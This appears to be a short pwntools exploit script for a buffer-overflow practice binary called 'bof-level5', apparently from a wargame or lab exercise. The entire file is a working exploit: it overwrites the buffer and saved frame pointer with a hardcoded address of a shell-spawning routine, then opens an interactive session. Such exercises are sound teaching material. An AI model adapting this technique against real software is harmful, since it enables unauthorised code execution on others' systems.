#!/usr/bin/env python

from pwn import *

context.terminal = '/bin/bash'

# p = process("./bof-levelx")
p = process("./bof-level5")

# gdb.attach(p)

# buffer is at -0x80(%ebp)
# [ buffer size - 0x80 ] [ saved ebp ]
#    'AAAA' + ${addr get a shell' + "A" * (0x80 - 8)             'dddd'

target_ebp_value = p32(0xffffd468)

buf = 'AAAA' + p32(0x80484cb) + 'A' * (0x80 - 8) + target_ebp_value

p.sendline(buf)

p.interactive()
